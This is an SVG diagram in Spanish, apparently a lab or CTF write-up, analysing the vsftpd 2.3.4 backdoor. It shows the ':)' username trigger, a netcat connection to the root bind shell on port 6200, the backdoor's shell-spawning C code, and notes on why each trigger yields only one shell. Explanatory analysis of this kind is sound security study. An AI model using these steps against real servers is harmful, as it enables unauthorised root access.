<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1240 600" width="1240" height="600">
  <style>
    .bg{fill:#0b1120}.panel{fill:#1e293b;stroke:#334155}
    .term{fill:#020617;stroke:#334155}
    .ttl{fill:#f8fafc;font:700 23px 'Segoe UI',system-ui,sans-serif}
    .sub{fill:#94a3b8;font:400 13px 'Segoe UI',system-ui,sans-serif}
    .h{fill:#f8fafc;font:700 12.5px 'Segoe UI',system-ui,sans-serif}
    .m{fill:#cbd5e1;font:400 12px ui-monospace,Menlo,Consolas,monospace}
    .mm{fill:#38bdf8;font:700 12px ui-monospace,Menlo,Consolas,monospace}
    .ok{fill:#22c55e;font:700 12px ui-monospace,Menlo,Consolas,monospace}
    .bad{fill:#ef4444;font:700 12px ui-monospace,Menlo,Consolas,monospace}
    .warn{fill:#f59e0b;font:400 12px ui-monospace,Menlo,Consolas,monospace}
    .dim{fill:#64748b;font:400 12px ui-monospace,Menlo,Consolas,monospace}
    .note{fill:#94a3b8;font:400 11.5px 'Segoe UI',system-ui,sans-serif}
    .crit{fill:#ef4444;font:700 13px 'Segoe UI',system-ui,sans-serif}
    .ar{stroke:#475569;stroke-width:2.5;fill:none}
    .arn{stroke:#ef4444;stroke-width:2.5;fill:none}
  </style>
  <rect class="bg" width="1240" height="600"/>
  <text class="ttl" x="20" y="38">El backdoor es de un solo uso</text>
  <text class="sub" x="20" y="60">execl() reemplaza la imagen del proceso: el bucle de accept() desaparece en la primera conexión</text>

  <!-- linea de tiempo -->
  <path class="ar" d="M60 150 L1180 150"/>

  <!-- paso 1 -->
  <circle cx="120" cy="150" r="13" fill="#38bdf8"/>
  <text class="h" x="120" y="120" text-anchor="middle">1 · Trigger</text>
  <text class="note" x="120" y="136" text-anchor="middle">USER backdoor:) + PASS</text>
  <rect class="term" x="30" y="176" width="200" height="104" rx="7"/>
  <text class="m" x="44" y="198">vsf_sysutil_extra()</text>
  <text class="m" x="44" y="218">bind(0.0.0.0:6200)</text>
  <text class="m" x="44" y="238">listen(6200, 100)</text>
  <text class="ok" x="44" y="262">→ accept() en bucle</text>

  <!-- paso 2 -->
  <circle cx="400" cy="150" r="13" fill="#22c55e"/>
  <text class="h" x="400" y="120" text-anchor="middle">2 · Conexión A</text>
  <text class="note" x="400" y="136" text-anchor="middle">nc 172.17.0.2 6200</text>
  <rect class="term" x="300" y="176" width="200" height="104" rx="7" stroke="#14532d"/>
  <text class="m" x="314" y="198">rfd = accept(fd, 0, 0)</text>
  <text class="m" x="314" y="218">dup2(rfd, 0/1/2)</text>
  <text class="ok" x="314" y="242">execl("/bin/sh","sh")</text>
  <text class="ok" x="314" y="262">→ shell ROOT</text>

  <!-- paso 3 -->
  <circle cx="680" cy="150" r="13" fill="#f59e0b"/>
  <text class="h" x="680" y="120" text-anchor="middle">3 · Conexión B</text>
  <text class="note" x="680" y="136" text-anchor="middle">mientras A sigue viva</text>
  <rect class="term" x="580" y="176" width="200" height="104" rx="7" stroke="#78350f"/>
  <text class="warn" x="594" y="198">TCP conecta (backlog)</text>
  <text class="bad" x="594" y="218">pero nadie acepta:</text>
  <text class="m" x="594" y="238">el accept() ya no</text>
  <text class="m" x="594" y="256">existe</text>
  <text class="bad" x="594" y="274">→ sin shell</text>

  <!-- paso 4 -->
  <circle cx="960" cy="150" r="13" fill="#ef4444"/>
  <text class="h" x="960" y="120" text-anchor="middle">4 · Cierre de A</text>
  <text class="note" x="960" y="136" text-anchor="middle">el shell termina</text>
  <rect class="term" x="860" y="176" width="200" height="104" rx="7" stroke="#7f1d1d"/>
  <text class="m" x="874" y="198">el proceso muere</text>
  <text class="m" x="874" y="218">y con él el socket</text>
  <text class="bad" x="874" y="242">→ 6200 deja de</text>
  <text class="bad" x="874" y="258">escuchar</text>
  <text class="bad" x="874" y="276">Connection refused</text>

  <!-- paso 5 -->
  <circle cx="1150" cy="150" r="13" fill="#22c55e"/>
  <text class="h" x="1150" y="120" text-anchor="middle">5 · Re-arm</text>
  <text class="note" x="1150" y="136" text-anchor="middle">nuevo trigger</text>
  <rect class="term" x="1050" y="176" width="170" height="104" rx="7" stroke="#14532d"/>
  <text class="m" x="1064" y="200">el puerto está</text>
  <text class="m" x="1064" y="218">libre: bind()</text>
  <text class="m" x="1064" y="236">vuelve a armar</text>
  <text class="ok" x="1064" y="262">→ shell root</text>

  <!-- explicacion -->
  <rect class="panel" x="20" y="308" width="1200" height="180" rx="10"/>
  <text class="crit" x="36" y="332">POR QUÉ — el código de vsf_sysutil_extra()</text>
  <rect class="term" x="36" y="344" width="560" height="128" rx="7"/>
  <text class="m" x="50" y="366">for (;;)</text>
  <text class="m" x="50" y="386">{</text>
  <text class="m" x="50" y="406">  rfd = accept(fd, 0, 0);</text>
  <text class="m" x="50" y="426">  close(0); close(1); close(2);</text>
  <text class="m" x="50" y="446">  dup2(rfd,0); dup2(rfd,1); dup2(rfd,2);</text>
  <text class="bad" x="50" y="468">  execl("/bin/sh","sh",(char *)0);</text>

  <text class="note" x="620" y="366">execl NO crea un proceso hijo: <tspan fill="#ef4444">sustituye la imagen del proceso actual</tspan>.</text>
  <text class="note" x="620" y="388">En cuanto se acepta la primera conexión, el bucle for(;;) deja de ejecutarse.</text>
  <text class="note" x="620" y="410">El socket queda ligado porque lo hereda el shell, pero ya nadie acepta:</text>
  <text class="note" x="620" y="432">una segunda conexión entra en la cola del backlog y se queda ahí.</text>
  <text class="note" x="620" y="456">Si el 6200 ya está ocupado, el bind() del nuevo hijo falla y hace exit(1):</text>
  <text class="m" x="620" y="478">if ((bind(fd, (struct sockaddr *)&amp;sa, sizeof(struct sockaddr))) &lt; 0) exit(1);</text>

  <rect class="panel" x="20" y="502" width="1200" height="80" rx="10" stroke="#f59e0b" stroke-width="2"/>
  <text class="h" x="36" y="526" fill="#f59e0b">CONSECUENCIA PRÁCTICA PARA LA EXPLOTACIÓN</text>
  <text class="note" x="36" y="550">Un trigger entrega UN shell root. Si se cierra, el listener desaparece y hay que disparar el backdoor de nuevo.</text>
  <text class="note" x="36" y="570">Además, la sesión FTP debe permanecer abierta mientras se usa el shell: al cerrarla, el proceso hijo muere con ella.</text>
</svg>